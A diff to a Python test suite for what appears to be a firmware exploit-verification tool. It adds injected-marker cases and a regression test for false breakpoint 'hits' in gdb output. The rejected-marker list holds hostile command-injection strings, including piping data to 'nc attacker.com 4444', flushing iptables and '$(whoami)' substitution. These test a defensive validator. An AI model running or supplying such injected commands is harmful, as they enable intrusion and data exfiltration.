@@ -56,6 +56,8 @@ from fw_audit.stage5_verification.fvvw.dynamic_track import (
         "echo claim_001_proof > /tmp/claim_001_proof",
         "mkdir -p /tmp/claim_001_proof",
         ";echo pwned;",  # benign shape, harmless content
+        ";echo 'proof_of_exploit';",  # quoted — the strategy agent's natural form
+        '; echo "proof_of_exploit" ;',  # double-quoted variant
     ],
 )
 def test_benign_markers_pass(marker: str):
@@ -80,6 +82,8 @@ def test_benign_markers_pass(marker: str):
         "; mknod /tmp/backdoor p ;",
         "; iptables -F ;",
         "; echo x | nc attacker.com 4444 ;",
+        "; echo '$(whoami)' ;",  # quoted command substitution stays rejected
+        "; echo `id` ;",  # quoted-adjacent backtick substitution stays rejected
     ],
 )
 def test_dangerous_markers_rejected(marker: str):
@@ -577,6 +581,35 @@ async def test_reach_target_succeeds_when_breakpoint_hits(tmp_path: Path):
     transcript, reached = await reach_target(ctx)
     assert reached is True
     assert "Breakpoint" in transcript
+
+
+async def test_reach_target_not_reached_when_only_breakpoint_set_then_sigterm(tmp_path: Path):
+    """Regression: 'Breakpoint 1 at 0x400900' is only the SET confirmation,
+    not a hit — on real MIPS firmware the process took SIGTERM before the
+    entry breakpoint fired, yet reach used to report reached=True (its
+    heuristic matched the word 'Breakpoint' / a successful batch). Only an
+    actual hit line ('Breakpoint N, 0x... in ...') counts as reached."""
+    def on_exec(command):
+        if "gdb-multiarch" in command:
+            return ExecutionResult(
+                command=command,
+                returncode=0,
+                stdout=(
+                    'The target architecture is set to "mips".\n'
+                    "Breakpoint 1 at 0x400900\n"
+                    "Program received signal SIGTERM, Terminated.\n"
+                ),
+                stderr="",
+                timed_out=False,
+            )
+        return None
+
+    executor = _FakeSessionExecutor(on_exec)
+    ctx = _ctx(tmp_path, session_executor=executor)
+    ctx.handle = SessionHandle(container_name="c1")
+
+    _transcript, reached = await reach_target(ctx)
+    assert reached is False
 
 
 async def test_satisfy_guards_logs_real_value_and_forces(tmp_path: Path):
